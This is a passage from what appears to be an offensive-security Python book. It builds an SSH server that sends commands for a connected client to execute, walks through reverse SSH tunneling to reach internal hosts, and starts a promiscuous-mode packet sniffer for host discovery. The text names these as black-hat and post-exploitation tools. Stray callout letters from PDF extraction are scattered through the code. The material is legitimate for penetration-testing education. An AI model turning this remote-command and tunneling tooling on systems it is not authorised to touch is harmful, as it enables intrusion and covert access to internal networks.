chan = bhSession.accept(20)
y print '[+] Authenticated!'
print chan.recv(1024)
chan.send('Welcome to bh_ssh')
 while True:
try:
command= raw_input("Enter command: ").strip('\n')
if command != 'exit':
28 Chapter 2
chan.send(command)
print chan.recv(1024) + '\n'
else:
chan.send('exit')
print 'exiting'
bhSession.close()
raise Exception ('exit')
except KeyboardInterrupt:
bhSession.close()
except Exception, e:
print '[-] Caught exception: ' + str(e)
try:
bhSession.close()
except:
pass
sys.exit(1)
This program creates an SSH server that our SSH client (where we want
to run commands) connects to. This could be a Linux, Windows, or even
OS X system that has Python and Paramiko installed.
For this example, we’re using the SSH key included in the Paramiko
demo files u. We start a socket listener w, just like we did earlier in the chap-
ter, and then SSHinize it v and configure the authentication methods x.
When a client has authenticated y and sent us the ClientConnected message ,
any command we type into the bh_sshserver is sent to the bh_sshclient and
executed on the bh_sshclient, and the output is returned to bh_sshserver. Let’s
give it a go.
Kicking the Tires
For the demo, I’ll run both the server and the client on my Windows
machine (see Figure 2-1).
u v
y
w
x
Figure 2-1: Using SSH to run commands
You can see that the process starts by setting up our SSH server u and
then connecting from our client v. The client is successfully connected w
The Network: Basics 29
and we run a command x. We don’t see anything in the SSH client, but the
command we sent is executed on the client y and the output is sent to our
SSH server .
ssH tunneling
SSH tunneling is amazing but can be confusing to understand and config-
ure, especially when dealing with a reverse SSH tunnel.
Recall that our goal in all of this is to run commands that we type in an
SSH client on a remote SSH server. When using an SSH tunnel, instead of
typed commands being sent to the server, network traffic is sent packaged
inside of SSH and then unpackaged and delivered by the SSH server.
Imagine that you’re in the following situation: You have remote access
to an SSH server on an internal network, but you want access to the web
server on the same network. You can’t access the web server directly, but
the server with SSH installed does have access and the SSH server doesn’t
have the tools you want to use installed on it.
One way to overcome this problem is to set up a forward SSH tun-
nel. Without getting into too much detail, running the command ssh -L
8008:web:80 justin@sshserver will connect to the ssh server as the user justin
and set up port 8008 on your local system. Anything sent to port 8008 will
be sent down the existing SSH tunnel to the SSH server and delivered to
the web server. Figure 2-2 shows this in action.
127.0.0.1
Port 8008
SSH server
SSH client
Web server
Simplified view of running the command:
Target network
ssh -L 8008:web:80 justin@sshserver
Figure 2-2: SSH forward tunneling
That’s pretty cool, but recall that not many Windows systems are
running an SSH server service. Not all is lost, though. We can configure
a reverse SSH tunnelling connection. In this case, we connect to our
own SSH server from the Windows client in the usual fashion. Through
that SSH connection, we also specify a remote port on the SSH server that
will be tunnelled to the local host and port (as shown in Figure 2-3). This
30 Chapter 2
local host and port can be used, for example, to expose port 3389 to access
an internal system using remote desktop, or to another system that the
Windows client can access (like the web server in our example).
127.0.0.1
Port 8008
SSH client
SSH server
Web server
Simplified view of running the command:
Target network
ssh -L 8008:web:80 justin@sshserver
Figure 2-3: SSH reverse tunneling
The Paramiko demo files include a file called rforward.py that does
exactly this. It works perfectly as is so I won’t just reprint that file, but I will
point out a couple of important points and run through an example of how
to use it. Open rforward.py, skip down to main(), and follow along.
def main():
u options, server, remote = parse_options()
password = None
if options.readpass:
password = getpass.getpass('Enter SSH password: ')
v client = paramiko.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.WarningPolicy())
verbose('Connecting to ssh host %s:%d ...' % (server[0], server[1]))
try:
client.connect(server[0], server[1], username=options.user, ¬
key_filename=options.keyfile, ¬
look_for_keys=options.look_for_keys, password=password)
except Exception as e:
print('*** Failed to connect to %s:%d: %r' % (server[0], server[1], e))
sys.exit(1)
verbose('Now forwarding remote port %d to %s:%d ...' % (options.port, ¬
remote[0], remote[1]))
try:
w reverse_forward_tunnel(options.port, remote[0], remote[1], ¬
client.get_transport())
except KeyboardInterrupt:
print('C-c: Port forwarding stopped.')
sys.exit(0)
The Network: Basics 31
The few lines at the top u double-check to make sure all the necessary
arguments are passed to the script before setting up the Parmakio SSH cli-
ent connection v (which should look very familiar). The final section in
main() calls the reverse_forward_tunnel function w.
Let’s have a look at that function.
def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):
x transport.request_port_forward('', server_port)
while True:
y chan = transport.accept(1000)
if chan is None:
continue
 thr = threading.Thread(target=handler, args=(chan, remote_host, ¬
remote_port))
thr.setDaemon(True)
thr.start()
In Paramiko, there are two main communication methods: transport,
which is responsible for making and maintaining the encrypted connec-
tion, and channel, which acts like a sock for sending and receiving data over
the encrypted transport session. Here we start to use Paramiko’s request_
port_forward to forward TCP connections from a port x on the SSH server
and start up a new transport channel y. Then, over the channel, we call the
function handler .
But we’re not done yet.
def handler(chan, host, port):
sock = socket.socket()
try:
sock.connect((host, port))
except Exception as e:
verbose('Forwarding request to %s:%d failed: %r' % (host, port, e))
return
verbose('Connected! Tunnel open %r -> %r -> %r' % (chan.origin_addr, ¬
chan.getpeername(), ¬
(host, port)))
 while True:
r, w, x = select.select([sock, chan], [], [])
if sock in r:
data = sock.recv(1024)
if len(data) == 0:
break
chan.send(data)
if chan in r:
data = chan.recv(1024)
if len(data) == 0:
break
sock.send(data)
chan.close()
32 Chapter 2
sock.close()
verbose('Tunnel closed from %r' % (chan.origin_addr,))
And finally, the data is sent and received .
Let’s give it a try.
Kicking the Tires
We will run rforward.py from our Windows system and configure it to be the
middle man as we tunnel traffic from a web server to our Kali SSH server.
C:\tmp\demos>rforward.py 192.168.100.133 -p 8080 -r 192.168.100.128:80 ¬
--user justin --password
Enter SSH password:
Connecting to ssh host 192.168.100.133:22 ...
C:\Python27\lib\site-packages\paramiko\client.py:517: UserWarning: Unknown ¬
ssh-r
sa host key for 192.168.100.133: cb28bb4e3ec68e2af4847a427f08aa8b
(key.get_name(), hostname, hexlify(key.get_fingerprint())))
Now forwarding remote port 8080 to 192.168.100.128:80 ...
You can see that on the Windows machine, I made a connection to
the SSH server at 192.168.100.133 and opened port 8080 on that server,
which will forward traffic to 192.168.100.128 port 80. So now if I browse
to http://127.0.0.1:8080 on my Linux server, I connect to the web server at
192.168.100.128 through the SSH tunnel, as shown in Figure 2-4.
Figure 2-4: Reverse SSH tunnel example
If you flip back to the Windows machine, you can also see the connec-
tion being made in Paramiko:
Connected! Tunnel open (u'127.0.0.1', 54537) -> ('192.168.100.133', 22) -> ¬
('192.168.100.128', 80)
SSH and SSH tunnelling are important to understand and use.
Knowing when and how to SSH and SSH tunnel is an important skill for
black hats, and Paramiko makes it possible to add SSH capabilities to your
existing Python tools.
We’ve created some very simple yet very useful tools in this chapter.
I encourage you to expand and modify as necessary. The main goal is to
develop a firm grasp of using Python networking to create tools that you
can use during penetration tests, post-exploitation, or while bug-hunting.
Let’s move on to using raw sockets and performing network sniffing, and
then we’ll combine the two to create a pure Python host discovery scanner.
The Network: Basics 33
3
tHe n e t work:
r aw s ocke ts anD sniffing
Network sniffers allow you to see packets entering
and exiting a target machine. As a result, they have
many practical uses before and after exploitation. In
some cases, you’ll be able to use Wireshark (http://
wireshark.org/) to monitor traffic, or use a Pythonic
solution like Scapy (which we’ll explore in the next
chapter). Nevertheless, there’s an advantage to knowing how to throw
together a quick sniffer to view and decode network traffic. Writing a tool
like this will also give you a deep appreciation for the mature tools that can
painlessly take care of the finer points with little effort on your part. You
will also likely pick up some new Python techniques and perhaps a better
understanding of how the low-level networking bits work.
In the previous chapter, we covered how to send and receive data using
TCP and UDP, and arguably this is how you will interact with most network
services. But underneath these higher-level protocols are the fundamental
building blocks of how network packets are sent and received. You will use
raw sockets to access lower-level networking information such as the raw
IP and ICMP headers. In our case, we are only interested in the IP layer
and higher, so we won’t decode any Ethernet information. Of course, if you
intend to perform any low-level attacks such as ARP poisoning or you are
developing wireless assessment tools, you need to become intimately famil-
iar with Ethernet frames and their use.
Let’s begin with a brief walkthrough of how to discover active hosts on a
network segment.
Building a UdP Host discovery tool
The main goal of our sniffer is to perform UDP-based host discovery on a
target network. Attackers want to be able to see all of the potential targets
on a network so that they can focus their reconnaissance and exploitation
attempts.
We’ll use a known behavior of most operating systems when handling
closed UDP ports to determine if there is an active host at a particular
IP address. When you send a UDP datagram to a closed port on a host,
that host typically sends back an ICMP message indicating that the port is
unreachable. This ICMP message indicates that there is a host alive because
we’d assume that there was no host if we didn’t receive a response to the
UDP datagram. It is essential that we pick a UDP port that will not likely be
used, and for maximum coverage we can probe several ports to ensure we
aren’t hitting an active UDP service.
Why UDP? There’s no overhead in spraying the message across an
entire subnet and waiting for the ICMP responses to arrive accordingly.
This is quite a simple scanner to build with most of the work going into
decoding and analyzing the various network protocol headers. We will
implement this host scanner for both Windows and Linux to maximize
the likelihood of being able to use it inside an enterprise environment.
We could also build additional logic into our scanner to kick off full
Nmap port scans on any hosts we discover to determine if they have a viable
network attack surface. These are exercises left for the reader, and I look
forward to hearing some of the creative ways you can expand this core con-
cept. Let’s get started.
Packet sniffing on windows and linux
Accessing raw sockets in Windows is slightly different than on its Linux
brethren, but we want to have the flexibility to deploy the same sniffer
to multiple platforms. We will create our socket object and then deter-
mine which platform we are running on. Windows requires us to set some
36 Chapter 3
additional flags through a socket input/output control (IOCTL),1 which
enables promiscuous mode on the network interface. In our first example,
we simply set up our raw socket sniffer, read in a single packet, and then quit.
import socket
import os
# host to listen on
host = "192.168.0.196"
# create a raw socket and bind it to the public interface
if os.name == "nt":
u socket_protocol = socket.IPPROTO_IP
else:
socket_protocol = socket.IPPROTO_ICMP
sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
sniffer.bind((host, 0))
# we want the IP headers included in the capture
v sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
# if we're using Windows, we need to send an IOCTL
# to set up promiscuous mode
w if os.name == "nt":
sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
# read in a single packet
x print sniffer.recvfrom(65565)
# if we're using Windows, turn off promiscuous mode
y if os.name == "nt":
sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
We start by constructing our socket object with the parameters nec-
essary for sniffing packets on our network interface u. The difference
between Windows and Linux is that Windows will allow us to sniff all
incoming packets regardless of protocol, whereas Linux forces us to spec-
ify that we are sniffing ICMP. Note that we are using promiscuous mode,
which requires administrative privileges on Windows or root on Linux.
Promiscuous mode allows us to sniff all packets that the network card sees,
even those not destined for your specific host. Next we set a socket option v
that includes the IP headers in our captured packets. The next step w is to
determine if we are using Windows, and if so, we perform the additional
step of sending an IOCTL to the network card driver to enable promiscu-
ous mode. If you’re running Windows in a virtual machine, you will likely
get a notification that the guest operating system is enabling promiscuous
mode; you, of course, will allow it. Now we are ready to actually perform
1. An input/output control (IOCTL) is a means for userspace programs to communicate with
kernel mode components. Have a read here: http://en.wikipedia.org/wiki/Ioctl.
The Network: Raw Sockets and Sniffing 37
some sniffing, and in this case we are simply printing out the entire raw
packet x with no packet decoding. This is just to test to make sure we have
the core of our sniffing code working. After a single packet is sniffed, we
again test for Windows, and disable promiscuous mode y before exiting
the script.
Kicking the Tires
Open up a fresh terminal or cmd.exe shell under Windows and run the
following:
python sniffer.py
In another terminal or shell window, you can simply pick a host to ping.
Here, we’ll ping nostarch.com: